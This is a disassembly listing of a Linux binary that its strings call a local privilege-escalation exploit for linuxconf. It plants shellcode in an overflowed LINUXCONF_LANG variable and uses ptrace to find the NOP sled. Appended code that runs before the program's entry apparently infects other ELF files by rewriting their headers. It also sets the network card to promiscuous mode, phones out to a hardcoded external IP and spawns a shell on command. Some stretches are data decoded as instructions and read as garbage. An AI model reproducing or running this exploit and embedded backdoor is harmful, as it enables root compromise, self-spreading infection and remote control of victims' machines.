push ebx
push ecx
push edx
push esi
push edi
jmp 0x8048f7b
pop eax
mov ebx, eax
sub ebx, 0x17
jmp eax
call fcn.08048f70
call fcn.080495cf
pop edi
pop esi
pop edx
pop ecx
pop ebx
mov eax, sym._start
jmp eax
push ebp
mov ebp, esp
sub esp, 0x14
push ebx
call 0x80486f0
pop ebx
add ebx, 0xa44
mov eax, dword [ebx + 0x58]
test eax, eax
je 0x8048703
call eax
pop ebx
leave
ret
push ebp
mov ebp, esp
sub esp, 8
cmp dword [obj.completed.4], 0
jne 0x804875d
jmp 0x8048733
mov eax, dword [obj.p.3]
lea edx, [eax + 4]
mov dword [obj.p.3], edx
mov eax, dword [eax]
call eax
mov eax, dword [obj.p.3]
cmp dword [eax], 0
jne 0x8048721
mov eax, sym.imp.__deregister_frame_info
test eax, eax
je 0x8048753
add esp, 0xfffffff4
push obj.__EH_FRAME_BEGIN__
call sym.imp.__deregister_frame_info
mov dword [obj.completed.4], 1
leave
ret
push ebp
mov ebp, esp
sub esp, 8
leave
ret
push ebp
mov ebp, esp
sub esp, 8
mov eax, sym.imp.__register_frame_info
test eax, eax
je 0x8048789
add esp, 0xfffffff8
push obj.object.11
push obj.__EH_FRAME_BEGIN__
call sym.imp.__register_frame_info
leave
ret
jmp dword [reloc.__register_frame_info]
push ebp
mov ebp, esp
sub esp, 8
leave
ret
push ebp
mov ebp, esp
sub esp, 0x14
push ebx
mov ebx, obj.__CTOR_LIST__
cmp dword [obj.__CTOR_LIST__], 0xffffffff
je 0x8048ce1
mov eax, dword [ebx]
call eax
add ebx, 0xfffffffc
cmp dword [ebx], 0xffffffff
jne 0x8048cd5
pop ebx
leave
ret
push ebp
mov ebp, esp
sub esp, 8
leave
ret
push ebp
mov ebp, esp
sub esp, 0x868
call sym.imp.fork
mov eax, eax
mov dword [pid], eax
cmp dword [pid], 0
jne 0x8048a61
add esp, 0xfffffff4
push 2
call sym.imp.sleep
add esp, 0x10
add esp, 0xfffffff8
push 0x808
lea eax, [s]
push eax
call sym.imp.bzero
add esp, 0x10
add esp, 0xfffffffc
push 0x800
push 0x41
lea eax, [s]
push eax
call sym.imp.memset
add esp, 0x10
add esp, 0xfffffffc
push 1
push obj.shellcode
push str.SCODE
call sym.imp.setenv
add esp, 0x10
add esp, 0xfffffffc
push 1
lea eax, [s]
push eax
push str.LINUXCONF_LANG
call sym.imp.setenv
add esp, 0x10
add esp, 0xfffffffc
push 0
push str.linuxconf
push str._sbin_linuxconf
call sym.imp.execl
add esp, 0x10
add esp, 0xfffffff8
push str.Error:_execl._n
mov eax, dword [obj.stderr]
push eax
call sym.imp.fprintf
add esp, 0x10
add esp, 0xfffffff4
push 0xffffffffffffffff
call sym.imp.exit
add esp, 0x10
jmp 0x8048cb0
add esp, 0xfffffff8
mov eax, dword [pid]
push eax
push 0x10
call sym.imp.ptrace
add esp, 0x10
mov eax, eax
test eax, eax
je 0x8048aa0
add esp, 0xfffffff8
push str.Error:_PTRACE_ATTACH._n
mov eax, dword [obj.stderr]
push eax
call sym.imp.fprintf
add esp, 0x10
add esp, 0xfffffff4
push 0xffffffffffffffff
call sym.imp.exit
add esp, 0x10
nop
lea esi, [esi]
add esp, 0xfffffffc
push 0
push 0
mov eax, dword [pid]
push eax
call sym.imp.waitpid
add esp, 0x10
add esp, 0xfffffff4
push str._n__Looking_at___esp_..___n
call sym.imp.printf
add esp, 0x10
add esp, 0xfffffff4
mov eax, dword [obj.stdout]
push eax
call sym.imp.fflush
add esp, 0x10
push 0
push 0
mov eax, dword [pid]
push eax
push 7
call sym.imp.ptrace
add esp, 0x10
mov eax, eax
test eax, eax
je 0x8048b10
add esp, 0xfffffff8
push str.Error:_PTRACE_CONT._n
mov eax, dword [obj.stderr]
push eax
call sym.imp.fprintf
add esp, 0x10
add esp, 0xfffffff4
push 0xffffffffffffffff
call sym.imp.exit
add esp, 0x10
nop
add esp, 0xfffffffc
push 0
push 0
mov eax, dword [pid]
push eax
call sym.imp.waitpid
add esp, 0x10
lea eax, [var_48h]
push eax
push 0
mov eax, dword [pid]
push eax
push 0xc
call sym.imp.ptrace
add esp, 0x10
mov eax, eax
test eax, eax
je 0x8048b60
add esp, 0xfffffff8
push str.Error:_PTRACE_GETREGS._n
mov eax, dword [obj.stderr]
push eax
call sym.imp.fprintf
add esp, 0x10
add esp, 0xfffffff4
push 0xffffffffffffffff
call sym.imp.exit
add esp, 0x10
add esp, 0xfffffff8
mov eax, dword [addr]
push eax
push str.__Looking_at:_0x_08x___n
call sym.imp.printf
add esp, 0x10
add esp, 0xfffffff4
mov eax, dword [obj.stdout]
push eax
call sym.imp.fflush
add esp, 0x10
mov dword [var_50h], 0
mov dword [var_4h], 0
push 0
mov eax, dword [addr]
mov edx, dword [var_50h]
add eax, edx
push eax
inc dword [var_50h]
mov eax, dword [pid]
push eax
push 1
call sym.imp.ptrace
add esp, 0x10
mov eax, eax
mov edx, eax
mov dword [var_4h], edx
cmp edx, 0xffffffff
jne 0x8048be0
add esp, 0xfffffff8
push str.Error:_PTRACE_PEEKTEXT._n
mov eax, dword [obj.stderr]
push eax
call sym.imp.fprintf
add esp, 0x10
add esp, 0xfffffff4
push 0xffffffffffffffff
call sym.imp.exit
add esp, 0x10
mov esi, esi
cmp dword [var_4h], 0x90909090
jne 0x8048bf0
jmp 0x8048bf2
nop
lea esi, [esi]
jmp 0x8048b93
dec dword [var_50h]
add esp, 0xfffffff8
mov eax, dword [addr]
mov edx, dword [var_50h]
add eax, edx
push eax
push str.__Shellcode_found_at:_0x_08x___n
call sym.imp.printf
add esp, 0x10
add esp, 0xfffffff4
mov eax, dword [obj.stdout]
push eax
call sym.imp.fflush
add esp, 0x10
push 0
push 0
mov eax, dword [pid]
push eax
push 8
call sym.imp.ptrace
add esp, 0x10
mov eax, eax
test eax, eax
je 0x8048c60
add esp, 0xfffffff8
push str.Error:_PTRACE_KILL._n
mov eax, dword [obj.stderr]
push eax
call sym.imp.fprintf
add esp, 0x10
add esp, 0xfffffff4
push 0xffffffffffffffff
call sym.imp.exit
add esp, 0x10
jmp 0x8048cb0
lea esi, [esi]
add esp, 0xfffffffc
push 0
push 0
mov eax, dword [pid]
push eax
call sym.imp.waitpid
add esp, 0x10
add esp, 0xfffffff4
push str.__Xploting_..___n_n
call sym.imp.printf
add esp, 0x10
add esp, 0xfffffff4
mov eax, dword [obj.stdout]
push eax
call sym.imp.fflush
add esp, 0x10
add esp, 0xfffffff4
push 1
call sym.imp.sleep
add esp, 0x10
mov eax, dword [addr]
mov ecx, dword [var_50h]
lea edx, [ecx + eax]
mov eax, edx
jmp 0x8048cb0
mov esi, esi
leave
ret
jmp dword [reloc.fork]
jmp dword [reloc.sleep]
jmp dword [reloc.bzero]
jmp dword [reloc.memset]
jmp dword [reloc.setenv]
jmp dword [reloc.execl]
jmp dword [reloc.fprintf]
jmp dword [reloc.exit]
jmp dword [reloc.ptrace]
jmp dword [reloc.waitpid]
jmp dword [reloc.printf]
jmp dword [reloc.fflush]
push ebp
mov ebp, esp
sub esp, 0x14
push ebx
call 0x8048560
pop ebx
add ebx, 0xbd4
call loc.Letext
call sym.frame_dummy
call loc.gcc2_compiled._2
pop ebx
leave
ret
xor ebp, ebp
pop esi
mov ecx, esp
and esp, 0xfffffff0
push eax
push esp
push edx
push loc.gcc2_compiled._3
push sym._init
push ecx
push esi
push main
call sym.imp.__libc_start_main
jmp dword [reloc.__libc_start_main]
push ebp
mov ebp, esp
sub esp, 0x1028
add esp, 0xfffffff4
push str._n__Linuxconf_Local_Xploit_by_RaiSe___n_n
call sym.imp.printf
add esp, 0x10
add esp, 0xfffffff4
mov eax, dword [obj.stdout]
push eax
call sym.imp.fflush
add esp, 0x10
add esp, 0xfffffffc
push obj.shellcode
push str._s.eng
lea eax, [filename]
push eax
call sym.imp.sprintf
add esp, 0x10
add esp, 0xfffffff8
push 0x1c0
lea eax, [filename]
push eax
call sym.imp.mkdir
add esp, 0x10
mov eax, eax
test eax, eax
je 0x8048828
add esp, 0xfffffff8
push str._Error_at_creat_directory__.eng___w__is_it_exist___delete_it_and_run_again._n_n
mov eax, dword [obj.stderr]
push eax
call sym.imp.fprintf
add esp, 0x10
add esp, 0xfffffff4
push 0xffffffffffffffff
call sym.imp.exit
add esp, 0x10
jmp 0x8048846
push obj.shellcode
push obj.shellcode
push str._s.eng__s.eng
lea eax, [filename]
push eax
call sym.imp.sprintf
add esp, 0x10
add esp, 0xfffffff8
push 0x8048dde
lea eax, [filename]
push eax
call sym.imp.fopen
add esp, 0x10
mov eax, eax
mov dword [stream], eax
cmp dword [stream], 0
jne 0x8048890
add esp, 0xfffffff8
push str._Error_at_creat_file___w__n_n
mov eax, dword [obj.stderr]
push eax
call sym.imp.fprintf
add esp, 0x10
add esp, 0xfffffff4
push 0xffffffffffffffff
call sym.imp.exit
add esp, 0x10
jmp 0x804889f
lea esi, [esi]
add esp, 0xfffffff4
mov eax, dword [stream]
push eax
call sym.imp.fclose
add esp, 0x10
add esp, 0xfffffff4
push str._Directory__file_created_.._n
call sym.imp.printf
add esp, 0x10
add esp, 0xfffffff4
push str.____dont_forget_to_delete_it_____n
call sym.imp.printf
add esp, 0x10
add esp, 0xfffffff4
mov eax, dword [obj.stdout]
push eax
call sym.imp.fflush
add esp, 0x10
add esp, 0xfffffff8
push 0x808
lea eax, [s]
push eax
call sym.imp.bzero
add esp, 0x10
call sym.get_shell
mov eax, eax
mov dword [var_1010h], eax
lea eax, [s]
mov dword [var_1014h], eax
mov dword [var_1018h], 0
lea esi, [esi]
cmp dword [var_1018h], 0x7ff
jle 0x8048920
jmp 0x8048940
mov esi, esi
mov eax, dword [var_1014h]
mov edx, dword [var_1010h]
mov dword [eax], edx
add dword [var_1014h], 4
add dword [var_1018h], 4
jmp 0x8048910
mov esi, esi
add esp, 0xfffffffc
push 1
push obj.shellcode
push str.SCODE
call sym.imp.setenv
add esp, 0x10
add esp, 0xfffffffc
push 1
lea eax, [s]
push eax
push str.LINUXCONF_LANG
call sym.imp.setenv
add esp, 0x10
add esp, 0xfffffffc
push 0
push str.linuxconf
push str._sbin_linuxconf
call sym.imp.execl
add esp, 0x10
add esp, 0xfffffff4
push 0xffffffffffffffff
call sym.imp.exit
jmp dword [reloc.sprintf]
jmp dword [reloc.mkdir]
jmp dword [reloc.fopen]
jmp dword [reloc.fclose]
push ebp
mov ebp, esp
sub esp, 0x14
push ebx
call 0x8048cfc
pop ebx
add ebx, 0x438
nop
call loc.gcc2_compiled._1
pop ebx
leave
ret
jmp dword [reloc.__deregister_frame_info]
pop eax
mov ebx, eax
sub ebx, 0x17
jmp eax
mov eax, 2
add byte [eax], al
int 0x80
cmp eax, 0
jne 0x8049611
call fcn.08049239
mov eax, ebx
call fcn.08049612
push ebx
push 0
push 0x6e69622f
mov ebx, esp
mov eax, 0xc
int 0x80
pop ebx
pop ebx
pop eax
call fcn.08049612
call fcn.0804956a
mov eax, 1
int 0x80
ret
pushal
xor edx, edx
push ebx
push ecx
push edx
mov eax, 0x1a
mov ebx, 0
mov ecx, 0
mov edx, 1
int 0x80
pop edx
pop ecx
pop ebx
cmp eax, 0xffffffff
je 0x8049261
popal
ret
mov eax, 1
push ebx
mov ebx, 0
int 0x80
pop ebx
push esi
push ebx
push eax
mov eax, 0x2d
push ebx
mov ebx, 0
int 0x80
pop ebx
mov esi, eax
pop ebx
add ebx, eax
mov eax, 0x2d
int 0x80
cmp eax, ebx
jne 0x8049001
mov eax, esi
jmp obj.completed.4
add byte [ecx], dh
xor eax, eax
jmp obj.completed.4
add byte [eax], al
add byte [eax], al
pop ebx
pop esi
ret
push eax
push ebx
push ecx
push edx
push esi
push edi
push eax
mov eax, 0x2d
push ebx
mov ebx, 0
int 0x80
pop ebx
mov esi, eax
mov ebx, eax
add ebx, 0x10c
mov eax, 0x2d
push ebx
mov ebx, ebx
int 0x80
pop ebx
cmp eax, ebx
jne 0x80496a6
mov word [esi], 0x2e
push ebx
push ecx
push edx
mov eax, 5
mov ebx, esi
mov ecx, 0
mov edx, 0
int 0x80
pop edx
pop ecx
pop ebx
mov edi, eax
cmp eax, 0xffffffff
je 0x804969b
xor ecx, ecx
push ebx
push ecx
mov eax, 0x59
mov ebx, edi
mov ecx, esi
int 0x80
pop ecx
pop ebx
cmp eax, 0
ja 0x8049684
mov ecx, 0x1e
pop ebx
push ebx
mov eax, esi
add eax, 0xa
call fcn.080496ae
inc ecx
cmp ecx, 0x1e
jb 0x8049669
mov eax, 0x2d
push ebx
mov ebx, esi
int 0x80
pop ebx
pop eax
pop edi
pop esi
pop edx
pop ecx
pop ebx
pop eax
ret
pushal
call 0x80491ec
mov eax, 2
int 0x80
cmp eax, 0
jne 0x80495a3
mov eax, 2
call mkdir
cmp eax, 0
je 0x80495c8
jmp 0x8049594
pop eax
jmp eax
call fcn.08049591
sub eax, 0x34
call fcn.08049510
mov eax, 1
call mkdir
cmp eax, 0
je 0x80495c8
jmp 0x80495b9
pop eax
jmp eax
call fcn.080495b6
sub eax, 0x5e
call fcn.08049510
mov eax, 1
int 0x80
mov eax, 2
add byte [eax], al
int 0x80
cmp eax, 0
jne 0x8049611
call fcn.08049239
mov eax, ebx
call fcn.08049612
push ebx
push 0
push 0x6e69622f
mov ebx, esp
mov eax, 0xc
int 0x80
pop ebx
pop ebx
pop eax
call fcn.08049612
call fcn.0804956a
mov eax, 1
int 0x80
ret
push eax
push ebx
push ecx
push edx
push esi
push edi
push eax
mov eax, 0x2d
push ebx
mov ebx, 0
int 0x80
pop ebx
mov esi, eax
mov ebx, eax
invalid
ret
invalid
push ebx
push ecx
push edx
xor ecx, ecx
mov ebx, 0xa
xor edx, edx
div ebx
inc ecx
cmp eax, 0
ja 0x8048f9b
mov eax, ecx
pop edx
pop ecx
pop ebx
ret
pop eax
mov ebx, eax
sub ebx, 0x17
jmp eax
pop eax
jmp eax
pop eax
jmp eax
pop eax
jmp eax
pop eax
jmp eax
pop eax
jmp eax
pop eax
jmp eax
push ebx
push ecx
push edx
push esi
mov esi, eax
xor ecx, ecx
lea edx, [esi + ecx]
inc ecx
cmp byte [edx], bl
jne 0x8049013
mov eax, ecx
dec eax
pop esi
pop edx
pop ecx
pop ebx
ret
push ebx
push ecx
push edx
push esi
push edi
mov edi, eax
mov eax, 0x20
call fcn.08048fd9
cmp eax, 0
je 0x8049303
mov esi, eax
mov eax, edi
mov ebx, esi
mov ecx, 4
call 0x8049032
mov eax, 2
mov ebx, 0xa
mov ecx, 8
call 0x8049078
mov edi, eax
cmp eax, 0xffffffff
je 0x80492f6
push ebx
push ecx
push edx
mov eax, 0x36
mov ebx, edi
mov ecx, 0x8913
mov edx, esi
int 0x80
pop edx
pop ecx
pop ebx
cmp eax, 0
jl 0x80492f6
or word [esi + 0x10], 0x100
push ebx
push ecx
push edx
mov eax, 0x36
mov ebx, edi
mov ecx, 0x8914
mov edx, esi
int 0x80
pop edx
pop ecx
pop ebx
cmp eax, 0
jl 0x80492f6
mov eax, edi
push eax
mov eax, 0x2d
push ebx
mov ebx, esi
int 0x80
pop ebx
pop eax
pop edi
pop esi
pop edx
pop ecx
pop ebx
ret
pushal
mov eax, 0x10
call fcn.08048fd9
cmp eax, 0
je 0x804950e
mov esi, eax
mov word [esi], 2
mov word [esi + 2], 0x5000
mov dword [esi + 4], 0x159b42cf
mov eax, 2
mov ebx, 1
mov ecx, 6
call 0x8049078
cmp eax, 0xffffffff
je 0x8049503
mov edi, eax
mov eax, edi
mov ebx, esi
mov ecx, 0x10
call 0x80490b1
cmp eax, 0xffffffff
je 0x80494f8
xor ebx, ebx
jmp 0x80494dc
pop eax
jmp eax
call fcn.080494d9
sub eax, 0x88
mov ecx, eax
call fcn.0804900b
mov edx, eax
mov ebx, edi
mov eax, 4
int 0x80
mov eax, 6
push ebx
mov ebx, edi
int 0x80
pop ebx
mov eax, 0x2d
push ebx
mov ebx, esi
int 0x80
pop ebx
popal
ret
pushal
mov esi, eax
mov al, byte [esi + 0x17]
cmp al, 0x11
jne 0x804934d
jmp 0x804931b
pop eax
jmp eax
call fcn.08049318
sub eax, 0x17
lea ebx, [esi + 0x2a]
mov ecx, 3
call 0x8049046
cmp eax, 0
je 0x804934d
lea eax, [esi + 0x2d]
lea edi, [esi + 0x2e]
cmp byte [eax], 1
je 0x804936a
cmp byte [eax], 2
je 0x80493ce
popal
ret
das
bound ebp, qword [ecx + 0x6e]
das
jae 0x80493be
add byte [0x78780063], ch
js 0x80493d6
jns 0x80493d9
jns 0x80493db
jp 0x80493de
jp 0x80493e0
add byte [eax], al
add byte [eax], al
mov eax, 2
int 0x80
cmp eax, 0
jne 0x80493cc
jmp 0x804937d
pop eax
jmp eax
call fcn.0804937a
sub eax, 0x28
mov esi, eax
jmp 0x804938e
pop eax
jmp eax
call fcn.0804938b
sub eax, 0x44
mov dword [esi], eax
jmp 0x804939f
pop eax
jmp eax
call fcn.0804939c
sub eax, 0x4d
mov dword [esi + 4], eax
mov dword [esi + 8], edi
push ebx
push ecx
push edx
mov eax, 0xb
mov ebx, dword [esi]
mov ecx, esi
mov edx, 0
int 0x80
pop edx
pop ecx
pop ebx
mov eax, 1
int 0x80
popal
ret
mov eax, 0x10
call fcn.08048fd9
cmp eax, 0
je 0x8049457
mov edx, eax
mov word [edx], 2
mov word [edx + 2], 0x1111
mov eax, dword [esi + 0x1a]
mov dword [edx + 4], eax
mov esi, edx
mov eax, 2
mov ebx, 2
mov ecx, 0x11
call 0x8049078
mov edi, eax
cmp eax, 0
jl 0x8049457
push 0x10
push esi
push 0
push 3
jmp 0x8049426
pop eax
jmp eax
call fcn.08049423
sub eax, 0x122
push eax
push edi
mov ecx, esp
push ebx
push ecx
mov eax, 0x66
mov ebx, 0xb
mov ecx, ecx
int 0x80
pop ecx
pop ebx
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
mov eax, 6
push ebx
mov ebx, edi
int 0x80
pop ebx
popal
ret
pop eax
jmp eax
pushal
call fcn.0804926f
mov edi, eax
cmp eax, 0
jl 0x8049559
mov eax, 0x400
call fcn.08048fd9
mov esi, eax
cmp eax, 0
je 0x8049559
call fcn.0804947d
push ebx
push ecx
push edx
mov eax, 3
mov ebx, edi
mov ecx, esi
mov edx, 0x400
int 0x80
pop edx
pop ecx
pop ebx
mov eax, esi
call fcn.0804930c
jmp 0x8049537
mov eax, 1
int 0x80
jo 0x80495d2
jo 0x8049594
add byte [arg_74h], ah
push 0xe8600030
pushal
call 0x80491ec
mov eax, 2
int 0x80
cmp eax, 0
jne 0x80495a3
mov eax, 2
call mkdir
cmp eax, 0
je 0x80495c8
jmp 0x8049594
pop eax
jmp eax
call fcn.08049591
sub eax, 0x34
call fcn.08049510
mov eax, 1
call mkdir
cmp eax, 0
je 0x80495c8
jmp 0x80495b9
pop eax
jmp eax
call fcn.080495b6
sub eax, 0x5e
call fcn.08049510
mov eax, 1
int 0x80
mov eax, 2
add byte [eax], al
pop eax
jmp eax
push ebx
push ecx
push edx
push esi
push edi
push ebx
mov ecx, eax
mov eax, 0x2d
push ebx
mov ebx, 0
int 0x80
pop ebx
mov esi, eax
add eax, 0x1c
mov ebx, eax
mov eax, 0x2d
push ebx
mov ebx, ebx
int 0x80
pop ebx
cmp eax, ebx
jne 0x8049a13
push ebx
push ecx
mov eax, 5
mov ebx, ecx
mov ecx, 2
int 0x80
pop ecx
pop ebx
cmp eax, 0xffffffff
jle 0x8049a08
mov dword [esi + 4], eax
push ebx
push ecx
push edx
mov eax, 0x13
mov ebx, dword [esi + 4]
mov ecx, 0
mov edx, 2
int 0x80
pop edx
pop ecx
pop ebx
cmp eax, 0xffffffff
jle 0x80499fc
mov dword [esi + 8], eax
push ebx
push ecx
push edx
mov eax, 0x13
mov ebx, dword [esi + 4]
mov ecx, 0
mov edx, 0
int 0x80
pop edx
pop ecx
pop ebx
mov ebx, esi
add ebx, 0x1c
add ebx, dword [esi + 8]
mov eax, 0x2d
push ebx
mov ebx, ebx
int 0x80
pop ebx
cmp eax, ebx
jne 0x80499fc
mov ecx, esi
add ecx, 0x1c
push ebx
push ecx
push edx
mov eax, 3
mov ebx, dword [esi + 4]
mov ecx, ecx
mov edx, dword [esi + 8]
int 0x80
pop edx
pop ecx
pop ebx
cmp word [esi + 0x2c], 2
jne 0x80499fc
mov dword [esi + 0xc], 0
xor ecx, ecx
mov edi, esi
add edi, 0x1c
add edi, dword [esi + 0x38]
mov eax, 0x20
mul ecx
add edi, eax
cmp dword [esi + 0xc], 0
jne 0x8049800
cmp dword [edi], 1
jne 0x8049800
cmp dword [edi + 4], 0
jne 0x8049800
mov eax, dword [edi + 8]
add eax, dword [edi + 0x10]
sub eax, 0x1000
cmp eax, dword [esi + 0x34]
je 0x8049a1a
mov eax, dword [edi + 4]
add eax, dword [edi + 0x10]
mov dword [esi + 0xc], eax
mov eax, dword [edi + 8]
add eax, dword [edi + 0x14]
mov dword [esi + 0x14], eax
add dword [edi + 0x10], 0x1000
add dword [edi + 0x14], 0x1000
mov dword [edi + 0x18], 7
jmp 0x8049810
cmp dword [esi + 0xc], 0
je 0x804985e
add dword [edi + 4], 0x1000
mov edx, edi
sub edx, esi
sub edx, 0x1c
push ebx
push ecx
push edx
mov eax, 0x13
mov ebx, dword [esi + 4]
mov ecx, edx
mov edx, 0
int 0x80
pop edx
pop ecx
pop ebx
cmp eax, 0xffffffff
je 0x80499fc
push ebx
push ecx
push edx
mov eax, 4
mov ebx, dword [esi + 4]
mov ecx, edi
mov edx, 0x20
int 0x80
pop edx
pop ecx
pop ebx
cmp eax, 0x20
jne 0x80499fc
inc cx
cmp cx, word [esi + 0x48]
jb 0x8049792
push ebx
push ecx
push edx
mov eax, 0x13
mov ebx, dword [esi + 4]
mov ecx, dword [esi + 0xc]
mov edx, 0
int 0x80
pop edx
pop ecx
pop ebx
cmp eax, 0xffffffff
je 0x80499fc
pop ecx
push ecx
push ebx
push ecx
push edx
mov eax, 4
mov ebx, dword [esi + 4]
mov ecx, ecx
mov edx, 0x1000
int 0x80
pop edx
pop ecx
pop ebx
cmp eax, 0x1000
jne 0x80499fc
mov edi, esi
add edi, 0x1c
add edi, dword [esi + 0xc]
mov edx, dword [esi + 8]
sub edx, dword [esi + 0xc]
push ebx
push ecx
push edx
mov eax, 4
mov ebx, dword [esi + 4]
mov ecx, edi
mov edx, edx
int 0x80
pop edx
pop ecx
pop ebx
mov ecx, dword [esi + 0x3c]
add ecx, 0x1000
push ebx
push ecx
push edx
mov eax, 0x13
mov ebx, dword [esi + 4]
mov ecx, ecx
mov edx, 0
int 0x80
pop edx
pop ecx
pop ebx
cmp eax, 0xffffffff
je 0x80499fc
xor ecx, ecx
mov edi, esi
add edi, 0x1c
add edi, dword [esi + 0x3c]
mov eax, 0x28
mul ecx
add edi, eax
mov eax, dword [edi + 0x10]
cmp eax, dword [esi + 0xc]
jb 0x8049928
add dword [edi + 0x10], 0x1000
jmp 0x8049937
add eax, dword [edi + 0xc]
cmp eax, dword [esi + 0x14]
jne 0x8049937
add dword [edi + 0x14], 0x1000
push ebx
push ecx
push edx
mov eax, 4
mov ebx, dword [esi + 4]
mov ecx, edi
mov edx, 0x28
int 0x80
pop edx
pop ecx
pop ebx
inc cx
cmp cx, word [esi + 0x4c]
jb 0x8049903
mov ecx, dword [esi + 0xc]
add ecx, 0x22
push ebx
push ecx
push edx
mov eax, 0x13
mov ebx, dword [esi + 4]
mov ecx, ecx
mov edx, 0
int 0x80
pop edx
pop ecx
pop ebx
cmp eax, 0xffffffff
je 0x80499fc
mov ecx, esi
add ecx, 0x34
push ebx
push ecx
push edx
mov eax, 4
mov ebx, dword [esi + 4]
mov ecx, ecx
mov edx, 4
int 0x80
pop edx
pop ecx
pop ebx
cmp eax, 4
jne 0x80499fc
add dword [esi + 0x3c], 0x1000
mov eax, dword [esi + 0x14]
mov dword [esi + 0x34], eax
push ebx
push ecx
push edx
mov eax, 0x13
mov ebx, dword [esi + 4]
mov ecx, 0
mov edx, 0
int 0x80
pop edx
pop ecx
pop ebx
cmp eax, 0xffffffff
je 0x80499fc
mov ecx, esi
add ecx, 0x1c
push ebx
push ecx
push edx
mov eax, 4
mov ebx, dword [esi + 4]
mov ecx, ecx
mov edx, 0x34
int 0x80
pop edx
pop ecx
pop ebx
mov eax, 6
push ebx
mov ebx, dword [esi + 4]
int 0x80
pop ebx
mov eax, 0x2d
push ebx
mov ebx, esi
int 0x80
pop ebx
pop eax
pop edi
pop esi
pop edx
pop ecx
pop ebx
ret
mov ecx, dword [edi + 4]
add ecx, dword [edi + 0x10]
sub ecx, 0x1000
push ebx
push ecx
push edx
mov eax, 0x13
mov ebx, dword [esi + 4]
mov ecx, ecx
mov edx, 0
int 0x80
pop edx
pop ecx
pop ebx
cmp eax, 0xffffffff
je 0x80499fc
pop edi
push edi
push ebx
push ecx
push edx
mov eax, 4
mov ebx, dword [esi + 4]
mov ecx, edi
mov edx, 0x22
int 0x80
pop edx
pop ecx
pop ebx
add edi, 0x26
push ebx
push ecx
push edx
mov eax, 0x13
mov ebx, dword [esi + 4]
mov ecx, 4
mov edx, 1
int 0x80
pop edx
pop ecx
pop ebx
push ebx
push ecx
push edx
mov eax, 4
mov ebx, dword [esi + 4]
mov ecx, edi
mov edx, 0xfda
int 0x80
pop edx
pop ecx
pop ebx
jmp 0x80499fc
